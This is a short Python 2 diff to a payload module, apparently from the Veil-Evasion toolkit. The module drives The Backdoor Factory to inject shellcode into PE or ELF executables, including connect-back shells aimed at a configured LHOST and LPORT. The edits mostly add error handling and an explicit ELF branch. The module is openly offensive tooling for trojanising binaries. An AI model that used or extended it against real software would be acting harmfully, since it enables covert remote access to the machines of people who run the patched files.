@@ -38,7 +38,11 @@ class Payload:
 
 
     def basicDiscovery(self):
-        testBinary = open(self.required_options["orig_exe"][0], 'rb')
+        try:
+	    testBinary = open(self.required_options["orig_exe"][0], 'rb')
+	except Exception as e:
+	    self.type = ""	    
+	    return
 	header = testBinary.read(8)
 	testBinary.close()
 	if 'MZ' in header:
@@ -47,9 +51,9 @@ class Payload:
 	    self.type = 'ELF'
 	else:
 	    raise IOError
-            print "\nBDF only supports intel 32/64bit PE and ELF binaries:\n" + helpers.color(stdout, warning=True)
+            print "\nBDF only supports intel 32/64bit PE and ELF binaries\n" 
             raw_input("\n[>] Press any key to return to the main menu:")
-            return ""
+            self.type = ""
 
 
 
@@ -77,9 +81,12 @@ class Payload:
 		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
                 self.extension = "exe"
 	    
-	    else:
+	    elif self.type == 'ELF':
 		targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw") 
         	self.extension = ""
+	    else:
+		print "\nInvalid File or File Type Submitted, try again.\n"
+		return ""
 
         else:
 
@@ -99,16 +106,23 @@ class Payload:
 	    if self.type == 'PE':
 		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0]))
             	self.extension = "exe"
-	    else:
+	    elif self.type == 'ELF':
                 targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe',  SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0])) 
 		self.extension = ""
+	    else:
+		print "\nInvalid File or File Type Submitted, try again.\n"
+		return ""
 
         print helpers.color("\n[*] Running The Backdoor Factory...")
 
         try:
 	    #PATCH STUFF
-	    targetFile.run_this()
-            
+	    try:
+	        targetFile.run_this()
+            except SystemExit as e:
+		#I use sys.exits in BDF, so not to leave Veil
+		print "\nBackdoorFactory Error, check options and binary\n"
+		return ""
 	    #Because shits fast yo
 	    time.sleep(4)
 	    
@@ -118,7 +132,7 @@ class Payload:
             f.close()
 
         except IOError:
-            print "\nError during The Backdoor Factory execution:\n" + helpers.color(stdout, warning=True)
+            print "\nError during The Backdoor Factory execution\n" 
             raw_input("\n[>] Press any key to return to the main menu:")
             return ""
 
@@ -127,7 +141,6 @@ class Payload:
 	    shutil.rmtree(settings.VEIL_EVASION_PATH+'backdoored')
 
         except Exception as e:
-	    print str(e)
 	    #quiet failure
 	    pass
 
